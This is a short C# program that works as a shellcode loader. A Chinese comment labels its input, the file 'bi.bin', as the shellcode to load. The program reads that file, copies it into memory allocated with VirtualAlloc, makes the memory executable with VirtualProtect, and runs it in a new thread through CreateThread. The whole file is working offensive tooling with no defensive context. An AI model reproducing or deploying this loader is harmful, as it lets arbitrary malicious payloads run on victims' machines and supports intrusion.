using System;
using System.IO;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, ref uint lpThreadId);
    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
    static void Main(string[] args)
    {
        string filePath = "bi.bin"; // 被加载的Shellcode
        byte[] shellcode = File.ReadAllBytes(filePath); 
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x1000, 0x40); 
        Marshal.Copy(shellcode, 0, addr, shellcode.Length);
        VirtualProtect(addr, (uint)shellcode.Length, 0x20, out uint oldProtect); 
        IntPtr hThread = IntPtr.Zero;
        uint threadId = 0;
        hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, ref threadId); 
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }

    
}
